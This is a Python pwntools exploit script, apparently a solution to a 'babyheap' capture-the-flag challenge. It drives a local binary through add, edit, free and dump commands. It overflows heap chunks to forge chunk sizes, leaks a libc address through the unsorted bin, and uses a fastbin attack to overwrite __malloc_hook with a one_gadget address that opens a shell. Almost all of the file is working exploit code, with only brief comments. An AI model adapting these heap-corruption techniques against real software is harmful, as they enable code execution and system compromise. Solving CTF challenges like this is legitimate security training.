from pwn import *
# context.log_level = "debug"
context.binary = "./babyheap" # set context.binary to change context word 
def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    log.info(word_bytes)
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


p = process("./babyheap")
libc = ELF("./libc.so.6")
def add(size):
	p.sendlineafter("Command: " , "1")
	p.sendlineafter("Size: " , str(size))
	# return int(p.recv(1))

def edit(index , size , content):
	# p.recv()
	p.sendlineafter("Command: " , "2")
	p.sendlineafter("Index: " , str(index))
	p.sendlineafter("Size: " , str(size))
	p.recvuntil("Content: ")
	p.send(content)

def free(index):
	p.sendlineafter("Command: " , "3" )
	p.sendlineafter("Index: " , str(index))

def dump(index):
	p.sendlineafter("Command: " , "4" )
	p.sendlineafter("Index: " , str(index))
	p.recvuntil("Content: \n")
	

# libc
main_arena_offset = 0x3c4b20
unsorted_bin_offset = 0x58
#

if __name__ == '__main__':
	add(0x10) # idx 0 # 0x0 - 0x20
	add(0x10) # idx 1 # 0x20 - 0x40
	add(0x10) # idx 2 # 0x40 - 0x60
	add(0x10) # idx 3 # 0x60 - 0x80
	add(0x80) # idx 4 # 0x80 - 0x110

	free(2)
	free(1) 
	# make fastbin[0] -> idx 3
	# edit idx 3 'chunk size
	# allocate idx 3 chunk to idx unsorted bin  
	payload = "a" * 0x10 + p64(0) + p64(0x21) + p8(0x80)
	edit(0 , len(payload) , payload)
	payload = "a" * 0x10 + p64(0) + p64(0x21)
	edit(3 , len(payload) , payload)
	add(0x10)
	add(0x10) # pointer to 0x60 # idx 2
	# free idx into unsorted_bin_list
	payload = "a" * 0x10 + p64(0) + p64(0x91)
	edit(3 , len(payload) , payload)
	add(0x10)# calloc between topchunk and idx 4 chunk # idx 5
	free(4)
	# get_libc_addr
	dump(2)
	addr = u64(p.recv(8))
	log_str = lambda x , y : x + " : " + hex(y)
	main_arena = addr - unsorted_bin_offset
	libc_base = main_arena - main_arena_offset
	log.info(log_str("main_arena" , main_arena))
	log.info(log_str("libc_base" , libc_base))
	# gdb.attach(p) # find padd_offset to get fake_chunk 
	malloc_hook_offset = 0x3c4b10
	padding_offset = 0x23

	one_gadget_addr = 0x4526a
	add(0x60) # idx 4 # into index 4'null
	free(4)
	fake_chunk_addr = libc_base + malloc_hook_offset - padding_offset 
	payload = "a" * 0x10 + p64(0) + p64(0x71) + p64(fake_chunk_addr)
	edit(3 , len(payload) , payload)
	add(0x60) # idx 4
	add(0x60) # idx 6
	# overwrite malloc_hook to one_gadget
	payload = "a" * (padding_offset - 0x8 * 2) + p64(libc_base + one_gadget_addr)
	edit(6 , len(payload) , payload)
	# get_shell
	add(0x10)
	p.interactive()


